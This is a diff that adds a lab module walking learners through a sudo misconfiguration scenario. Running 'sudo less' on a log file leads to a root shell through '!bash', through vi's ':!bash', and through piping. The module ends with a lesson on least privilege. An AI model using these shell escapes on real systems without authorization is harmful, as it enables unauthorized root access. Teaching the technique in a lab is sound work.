@@ -1,0 +1,208 @@
+= Testing the Vulnerability
+
+== Controlled Testing
+
+Now that we've identified the misconfiguration, let's verify it works (or rather, doesn't work as Scott intended). We'll demonstrate the privilege escalation in a controlled manner.
+
+[IMPORTANT]
+====
+**Security Note:**
+
+We're testing this vulnerability on a lab system specifically set up for this purpose. In a real environment, you would:
+
+1. Test on an isolated system or in a test environment
+2. Document every step for your incident report
+3. Have proper authorization before attempting privilege escalation
+4. Ensure you're not violating any policies or laws
+
+Never test security vulnerabilities on production systems or systems you don't own/have permission to test!
+====
+
+== Switching to devuser
+
+First, let's become the devuser to see the situation from their perspective:
+
+[source,bash,role=execute]
+----
+sudo -i -u devuser
+----
+
+Verify who we are:
+
+[source,bash,role=execute]
+----
+whoami
+id
+----
+
+You should see that you're running as `devuser` with a regular user ID (UID 1001 or similar).
+
+== The "Innocent" Usage
+
+Let's first use the `less` command the way Scott intended - just viewing a log file:
+
+[source,bash,role=execute]
+----
+sudo /usr/bin/less /var/log/messages
+----
+
+[NOTE]
+====
+This opens the log file in the `less` pager. Notice that:
+
+* You can scroll through the file with arrow keys or Page Up/Down
+* Press `q` to quit
+
+So far, this seems harmless. Let's press `q` to exit less.
+====
+
+== The Privilege Escalation
+
+Now let's demonstrate how this becomes a security vulnerability. Run the same command again:
+
+[source,bash,role=execute]
+----
+sudo /usr/bin/less /var/log/messages
+----
+
+This time, instead of just reading the file, we'll exploit less's ability to execute commands:
+
+**While less is running, type:** `!bash`
+
+[IMPORTANT]
+====
+**What just happened:**
+
+1. You pressed `!` which tells less you want to execute a command
+2. You typed `bash` to spawn a bash shell
+3. Less executed this command **with the same privileges it's running with**
+4. Since less was run with `sudo`, it's running as root
+5. Therefore, the bash shell it spawned is also running as root!
+====
+
+Verify you're now root:
+
+[source,bash,role=execute]
+----
+whoami
+id
+----
+
+You should see `root` and UID 0. You now have complete system control!
+
+== Demonstrating Root Access
+
+Let's prove we have full root access by doing something only root can do:
+
+[source,bash,role=execute]
+----
+ls -la /root
+----
+
+Try creating a file in root's home directory:
+
+[source,bash,role=execute]
+----
+touch /root/unauthorized_access_$(date +%Y%m%d).txt
+----
+
+[source,bash,role=execute]
+----
+ls -la /root/unauthorized_*
+----
+
+[TIP]
+====
+**From Nate:**
+
+This is exactly what InfoSec detected. The logs showed devuser running `sudo less`, followed by file operations in /root and other root-only areas. Now you understand how it happened.
+
+This kind of privilege escalation is particularly dangerous because:
+
+1. The audit logs show an "authorized" sudo command
+2. It doesn't look suspicious at first glance
+3. The user doesn't need to exploit any software bugs
+4. It's completely legitimate use of the tool's features
+====
+
+== Alternative Escalation Methods
+
+The `!bash` method isn't the only way to escalate privileges through less. Let's try another approach.
+
+First, exit the current root shell:
+
+[source,bash,role=execute]
+----
+exit
+----
+
+You should be back as devuser. Run sudo less again:
+
+[source,bash,role=execute]
+----
+sudo /usr/bin/less /var/log/messages
+----
+
+This time, **while less is running, press:** `v`
+
+This opens the file in your default editor (likely vi or vim), which is ALSO running as root. From vi, you can spawn a shell too:
+
+**In vi, type:** `:!bash`
+
+[NOTE]
+====
+Vi/Vim allow you to run shell commands by typing `:!` followed by the command. Since the editor is running as root, any commands you run this way also run as root.
+====
+
+Exit this shell too:
+
+[source,bash,role=execute]
+----
+exit
+----
+
+Then quit vim by typing `:q!` and pressing Enter.
+
+== Understanding the Attack Surface
+
+Let's document all the ways this sudo rule can be exploited:
+
+1. **Direct shell spawn**: `!bash` or `!sh` from within less
+2. **Via editor**: Press `v` to open editor, then `:!bash` from there
+3. **Via pipe**: Use `|` in less to pipe to a shell command
+4. **File operations**: Write to files using less's save features (though less is primarily a viewer)
+
+Exit back to the regular devuser session:
+
+[source,bash,role=execute]
+----
+# If you're still in less or vim, exit those first
+# Then return to rhel user
+exit
+----
+
+== The Security Lesson
+
+This demonstrates a critical principle in privilege management:
+
+[IMPORTANT]
+====
+**Key Security Principle:**
+
+Granting sudo access to a command grants access to ALL capabilities of that command, not just the obvious or intended ones.
+
+Commands that seem "safe" can often:
+
+* Execute arbitrary shell commands
+* Spawn interactive shells
+* Read/write files beyond their intended scope
+* Call other programs with their elevated privileges
+====
+
+[quote, Manager Scott's lesson learned (hopefully)]
+____
+"I thought I was being clever by giving them just 'enough' access to do their job. I didn't realize that `less` could do so much more than just view files. I should have consulted with the security team before creating sudo rules."
+____
+
+Now let's move on to properly fixing this misconfiguration in the next module.
+
